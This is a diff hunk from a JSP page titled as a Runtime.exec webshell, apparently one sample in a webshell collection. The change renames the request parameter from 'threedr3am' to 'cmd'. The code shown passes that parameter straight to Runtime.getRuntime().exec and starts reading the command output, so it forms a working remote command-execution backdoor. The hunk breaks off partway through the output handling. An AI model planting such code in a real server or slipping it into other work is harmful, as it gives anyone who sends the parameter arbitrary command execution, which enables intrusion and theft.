@@ -5,7 +5,7 @@
 <body>
 <h2>Runtime.exec的JSP Webshell</h2>
 <%
-    String s2 = request.getParameter("threedr3am");
+    String s2 = request.getParameter("cmd");
     Process process = Runtime.getRuntime().exec(s2.split(" "));
     InputStream inputStream = process.getInputStream();
     StringBuilder stringBuilder = new StringBuilder();
